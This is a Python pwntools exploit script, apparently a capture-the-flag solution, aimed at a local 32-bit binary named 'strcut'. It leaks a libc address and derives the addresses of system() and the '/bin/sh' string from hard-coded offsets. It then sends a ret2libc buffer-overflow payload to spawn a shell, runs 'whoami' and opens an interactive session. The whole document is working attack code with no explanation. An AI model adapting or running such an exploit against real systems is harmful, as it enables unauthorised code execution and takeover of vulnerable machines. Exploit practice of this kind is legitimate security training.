from pwn import *
#context.log_level = 'debug'
p = process('./strcut')
elf = ELF('./strcut')
main_addr = elf.symbols['main']

# gdb.attach(p,'''
# b Suggestion
# ''')

hello = 'helloworld'
cmd = 'whoami'
system_to_c99_scanf = 0x00021320 #Q3
system_to_sh_str = 0x0015bb2b - 0x0003adb0

p.recvuntil(':')
p.sendline(str(len(hello)))
p.recvuntil(':')
p.sendline(hello)

p.recvuntil(':')
p.sendline('68 64')

buf = p.recv(1)
buf = p.recv(4)
c99_scanf_addr = u32(buf)

system_addr = c99_scanf_addr - system_to_c99_scanf
sh_addr = system_addr + system_to_sh_str

p.recvuntil('...')

payload = ''
junk = ''
for i in xrange(3):
    junk += 'A%03d'%i
payload = junk + 'U' + p32(system_addr) + p32(main_addr) + p32(sh_addr)
p.sendline(payload)

p.sendline(cmd)
p.sendline("exit")

p.interactive()
